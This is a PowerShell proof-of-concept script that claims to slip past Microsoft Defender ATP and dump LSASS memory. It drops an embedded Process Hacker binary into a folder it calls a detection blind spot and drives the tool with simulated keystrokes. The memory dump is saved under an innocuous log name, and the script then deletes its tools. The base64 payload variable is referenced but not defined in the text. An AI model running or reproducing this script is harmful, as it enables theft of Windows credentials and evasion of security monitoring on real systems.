# This is a PoC to bypass ATP and dump LSASS process via Process Hacker.
# 9/15/2022
# After analyzing the behavior of ATP
# I found a blind spot in "C:\Program Files"
# You can drop Process Hacker to dump LSASS memory without being detected by ATP.

Write-Host "[>] This is a PoC to bypass ATP and dump LSASS process via Process Hacker.";
Write-Host "[>] Let's check your privlege.";
sleep -Milliseconds 800
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
$IsAdmin = $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if($IsAdmin -eq $true) {
    Write-Host "[+] You are ready to go."
    sleep -Milliseconds 800
    $Check = (Get-ItemProperty -Path Registry::"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Advanced Threat Protection\Status").OnboardingState
    Get-ItemProperty -Path Registry::"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Advanced Threat Protection\Status"
    if($Check -eq 1){
        Write-Host "[+] Advanced Threat Protection (ATP) is enabled.";
        Write-Host "[>] You know what time it is? BYPASS TIME xD.";
        sleep -Milliseconds 800
        Write-Host "[+] I dropped the payload to 'C:\Program Files\PH.exe'.";
        # Encoded Process Hacker.
        # Write Process Hacker to C:\Program Files\ folder.
        [IO.File]::WriteAllBytes("C:\Program Files\PH.exe", [Convert]::FromBase64String($base64string))
        sleep -Milliseconds 800
        Write-Host "    [+] Run it as Administrator.";
        $phPID = (Start-Process -FilePath "C:\Program Files\PH.exe" -Verb RunAs -passthru).ID
        Write-Host "    [+] PID: "$phPID
        $wshell = New-Object -ComObject wscript.shell ;
        Sleep 1
        while($true){
            $checkWindow = $wshell.AppActivate('Process Hacker');
            if($checkWindow -eq $true){
                break
            }
            sleep -Milliseconds 800
        }
        
        sleep -Milliseconds 500
        $wshell.SendKeys('lsass')
        sleep -Milliseconds 500
        $wshell.SendKeys('+{F10}')
        sleep -Milliseconds 500
        $wshell.SendKeys('{DOWN}')
        $wshell.SendKeys('{DOWN}')
        $wshell.SendKeys('{DOWN}')
        $wshell.SendKeys('{DOWN}')
        $wshell.SendKeys('{DOWN}')
        $wshell.SendKeys('{ENTER}')
        $wshell.SendKeys('C:\Windows\Temp\Note.log')
        $wshell.SendKeys('{ENTER}')
        sleep -Milliseconds 800
        $CheckFile = Test-Path -Path "C:\Windows\Temp\Note.log";
        if($CheckFile -eq $true){
            sleep -Milliseconds 800
            Write-Host "[+] LSASS process dumped successfully to 'C:\Windows\Temp\Note.log'.";
            sleep -Milliseconds 800
            Write-Host "[>] I will clean up the mess."
            Stop-Process -Id $phPID -Force
            sleep -Milliseconds 800
            Remove-Item -Path "C:\Program Files\PH.exe" -Force
            Write-Host "    [+] Done, enjoy.";
        }
        
    }
    else {
        Write-Host "[-] Advanced Threat Protection (ATP) is disabled."
    }
}